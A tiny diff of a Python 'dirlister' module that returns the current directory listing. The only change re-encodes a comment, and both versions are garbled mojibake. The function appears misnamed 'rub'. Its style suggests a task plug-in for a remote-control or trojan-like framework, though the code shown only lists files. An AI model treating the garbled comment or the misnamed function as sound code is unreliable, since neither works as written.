@@ -2,5 +2,5 @@ import os
 
 def rub(**args):
     print("[*] In dirlister module.")
-    files=os.listdir(".")   #µÃµ½µ±Ç°ÎÄ¼ş¼ĞÏÂµÄËùÓĞ×ÓÏî
+    files=os.listdir(".")   #å¾—åˆ°å½“å‰æ–‡ä»¶å¤¹ä¸‹çš„æ‰€æœ‰å­é¡¹
     return str(files)
